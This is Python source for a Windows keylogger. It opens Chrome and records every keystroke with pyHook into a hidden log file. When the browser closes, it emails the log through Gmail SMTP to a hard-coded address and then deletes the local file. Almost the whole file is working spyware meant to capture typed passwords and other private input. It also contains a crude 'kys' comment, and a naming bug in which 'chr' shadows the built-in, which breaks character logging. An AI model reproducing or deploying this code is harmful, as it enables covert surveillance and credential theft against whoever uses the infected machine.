import smtplib, os, subprocess, pyHook, pythoncom, time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText

#open google in chrome--------------------------------------------------

chr = subprocess.Popen("C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")
# line above should be able to open Chrome on device...

#keylogger--------------------------------------------------------------

#creating the log file

f = open("C:\\Users\\Public\\Documents\\KeyLog.txt", "w+")

#Defining the multitude of functions fml--------------------------------

def OnKeyBoardEvent(event):
    try:
        if event.Ascii == 8:
            f.write("[BSC]")
        elif event.Ascii == 27:
            f.write("[ESC]")
        elif event.Ascii == 9:
            f.write("[TAB]")
        elif event.Ascii == 13:
            f.write("[ENR]")
        elif event.Ascii == 127:
            f.write("[DEL]")
        elif event.Ascii == 0:
            f.write("[ascii0]")
        else:
            f.write(chr(event.Ascii))  
    except:
        pass
    return True

def Mail_Log():
    email_address = "ratnodeepb@gmail.com"
    PASSWORD = input("PASSWORD REQUEST:")

    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'LOG' + time.asctime()

    f = open("C:\\Users\\Public\\Documents\\KeyLog.txt", "r")
    content = f.read()
    msg.attach(MIMEText(content, 'plain'))
    
    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login(email_address, PASSWORD)

    smtp.sendmail(email_address, email_address, msg.as_string())
    smtp.quit()
    
#Running the actual code------------------------------------------------

hm = pyHook.HookManager()
hm.KeyDown = OnKeyBoardEvent
hm.HookKeyboard()

while True:
    time_check = time.time() + 30
    while time.time() <= time_check:
        pythoncom.PumpWaitingMessages()
    activity = chr.poll()
    print("[CHROME_ACTIVITY]") #apparently spaces is much better, kys richard hendricks
    if activity != None:
        hm.UnhookKeyboard()
        f.close()
        Mail_Log()
        os.remove("C:\\Users\\Public\\Documents\\KeyLog.txt")
        break
